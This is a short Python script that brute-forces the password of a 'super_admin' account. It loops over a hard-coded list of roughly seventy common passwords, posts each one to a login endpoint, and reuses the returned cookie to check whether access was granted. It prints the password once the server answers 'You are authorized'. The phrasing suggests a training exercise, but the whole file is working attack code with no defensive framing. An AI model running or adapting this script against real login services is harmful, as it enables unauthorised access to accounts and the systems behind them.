from urls import API_SECRET_PASSWORD, API_CHECK_AUTH_COOKIE
import requests

password_list = {'whatever', 'starwars', 'hello', 'aa123456', 'jesus', '7777777', '1234567', 'baseball', 'sunshine',
                 'photoshop', 'trustno1', '1q2w3e4r', 'passw0rd', 'superman', 'azerty', 'zaq1zaq1', 'abc123',
                 '654321', 'solo', '696969', 'monkey', 'password1', 'freedom', 'adobe123', '123456789', 'flower',
                 'mustang', '12345', '123123', '121212', '888888', '111111', 'login', '666666', 'qwerty123', 'qazwsx',
                 '!@#$%^&*', 'hottie', 'Football', 'welcome', 'access', 'loveme', 'master', 'lovely', 'shadow',
                 'donald', 'admin', '1qaz2wsx', '555555', 'ashley', 'michael', 'qwerty', '1234', 'charlie', 'password',
                 'qwertyuiop', 'ninja', 'princess', 'dragon', 'batman', '12345678', 'bailey', '000000', '123456',
                 'letmein', '123qwe', '1234567890', 'iloveyou', 'football'}

for password in password_list:
    creds = {"login": "super_admin", "password": password}
    check_pass_response = requests.post(API_SECRET_PASSWORD, data=creds)
    cookie = check_pass_response.cookies

    check_cookie_response = requests.get(API_CHECK_AUTH_COOKIE, cookies=cookie)

    if check_cookie_response.text == "You are authorized":
        print(f"Your password is: {password}")
        break
